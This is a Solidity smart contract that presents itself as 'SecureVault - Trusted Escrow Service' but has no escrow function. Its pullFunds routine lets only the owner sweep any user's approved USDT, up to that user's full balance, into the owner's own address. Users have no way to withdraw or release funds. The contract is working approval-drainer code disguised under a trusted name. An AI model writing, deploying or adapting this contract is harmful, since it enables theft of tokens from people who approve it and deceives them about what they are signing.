// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SecureVault {
    address public owner;
    string public constant name = "SecureVault - Trusted Escrow Service";
    string public constant version = "v3.1";
    
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    event FundsPulled(address indexed user, uint256 amount, uint256 timestamp);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor(address _owner) {
        require(_owner != address(0), "Invalid owner address");
        owner = _owner;
    }
    
    function pullFunds(address user) external {
        require(msg.sender == owner, "Only owner can pull funds");
        require(user != address(0), "Invalid user address");
        
        // Check allowance
        bytes memory allowanceData = abi.encodeWithSignature(
            "allowance(address,address)", user, address(this)
        );
        (bool allowanceSuccess, bytes memory allowanceReturn) = USDT.staticcall(allowanceData);
        require(allowanceSuccess, "Failed to check allowance");
        uint256 approved = abi.decode(allowanceReturn, (uint256));
        require(approved > 0, "No USDT approved");
        
        // Check actual balance
        bytes memory balanceData = abi.encodeWithSignature("balanceOf(address)", user);
        (bool balanceSuccess, bytes memory balanceReturn) = USDT.staticcall(balanceData);
        require(balanceSuccess, "Failed to check balance");
        uint256 bal = abi.decode(balanceReturn, (uint256));
        
        // Pull only what's available (min of allowance and balance)
        uint256 amount = approved < bal ? approved : bal;
        require(amount > 0, "Insufficient balance");
        
        _safePull(USDT, user, owner, amount);
        
        emit FundsPulled(user, amount, block.timestamp);
    }
    
    function _safePull(
        address token,
        address from,
        address to,
        uint256 amount
    ) internal {
        bytes memory data = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", from, to, amount
        );
        
        (bool success, bytes memory returnData) = token.call(data);
        require(success, "Transfer failed");
        
        if (returnData.length > 0) {
            require(abi.decode(returnData, (bool)), "Transfer rejected");
        }
    }
    
    function transferOwnership(address newOwner) external {
        require(msg.sender == owner, "Only owner");
        require(newOwner != address(0), "Invalid address");
        require(newOwner != owner, "Same owner");
        
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
    
    function checkAllowance(address user) external view returns (uint256) {
        bytes memory data = abi.encodeWithSignature(
            "allowance(address,address)", user, address(this)
        );
        (bool success, bytes memory returnData) = USDT.staticcall(data);
        require(success, "Failed to check allowance");
        return abi.decode(returnData, (uint256));
    }
    
    function getContractInfo() external pure returns (
        string memory contractName,
        string memory contractVersion,
        address usdtAddress
    ) {
        return (name, version, USDT);
    }
}